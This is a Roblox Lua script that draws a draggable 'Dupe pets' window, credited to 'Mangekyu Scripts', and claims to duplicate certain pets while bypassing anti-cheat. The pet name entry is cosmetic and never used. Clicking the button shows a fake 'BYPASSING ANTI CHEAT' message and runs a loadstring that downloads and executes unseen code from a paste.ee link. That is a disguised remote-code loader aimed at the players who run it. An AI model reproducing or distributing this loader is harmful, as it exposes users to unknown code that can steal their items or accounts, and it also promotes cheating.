-- Seed Spawner GUI with Smooth Notification + Draggable + Script Execution
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Player = Players.LocalPlayer

-- Main GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SeedSpawnerGUI"
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Frame
local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 250, 0, 150)
Frame.Position = UDim2.new(0.5, -125, 0.5, -75)
Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Frame.Active = true
Frame.Draggable = true

local UICorner1 = Instance.new("UICorner", Frame)

-- Title
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.Text = "Dupe pets / only Dragon Fly, Raccoon, Red Fox"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 10

-- TextBox
local TextBox = Instance.new("TextBox", Frame)
TextBox.Position = UDim2.new(0.1, 0, 0, 40)
TextBox.Size = UDim2.new(0.8, 0, 0, 30)
TextBox.PlaceholderText = "Enter Pet Name"
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 10
TextBox.TextColor3 = Color3.new(0, 0, 0)
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
local UICorner2 = Instance.new("UICorner", TextBox)

-- Button
local Button = Instance.new("TextButton", Frame)
Button.Position = UDim2.new(0.1, 0, 0, 80)
Button.Size = UDim2.new(0.8, 0, 0, 30)
Button.Text = "Dupe Pets"
Button.Font = Enum.Font.GothamBold
Button.TextSize = 16
Button.TextColor3 = Color3.new(1, 1, 1)
Button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
local UICorner3 = Instance.new("UICorner", Button)

-- Credit
local Credit = Instance.new("TextLabel", Frame)
Credit.Position = UDim2.new(0, 0, 1, -20)
Credit.Size = UDim2.new(1, 0, 0, 20)
Credit.BackgroundTransparency = 1
Credit.Font = Enum.Font.Code
Credit.Text = "Made By Mangekyu Scripts"
Credit.TextColor3 = Color3.fromRGB(200, 200, 200)
Credit.TextSize = 14

-- Notification UI
local Notif = Instance.new("Frame")
Notif.Parent = ScreenGui
Notif.Size = UDim2.new(0, 200, 0, 40)
Notif.Position = UDim2.new(0.5, -100, 1, 50)
Notif.AnchorPoint = Vector2.new(0.5, 1)
Notif.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Notif.Visible = false
local NotifCorner = Instance.new("UICorner", Notif)

local NotifText = Instance.new("TextLabel", Notif)
NotifText.Size = UDim2.new(1, 0, 1, 0)
NotifText.BackgroundTransparency = 1
NotifText.Font = Enum.Font.GothamBold
NotifText.TextSize = 14
NotifText.TextColor3 = Color3.new(1, 1, 1)
NotifText.Text = "BYPASSING ANTI CHEAT"

-- Show smooth notification
local function showNotification(msg)
	NotifText.Text = msg
	Notif.Visible = true
	Notif.Position = UDim2.new(0.5, -100, 1, 10)

	TweenService:Create(Notif, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, -100, 1, -10)
	}):Play()

	task.delay(3, function()
		TweenService:Create(Notif, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {
			Position = UDim2.new(0.5, -100, 1, 50)
		}):Play()
		task.wait(0.3)
		Notif.Visible = false
	end)
end

-- Button Click
Button.MouseButton1Click:Connect(function()
	local seed = TextBox.Text
	if seed and seed ~= "" then
		showNotification("BYPASSING ANTI CHEAT")
		loadstring(game:HttpGet("https://paste.ee/r/a7PN8d6Q"))()
	end
end)
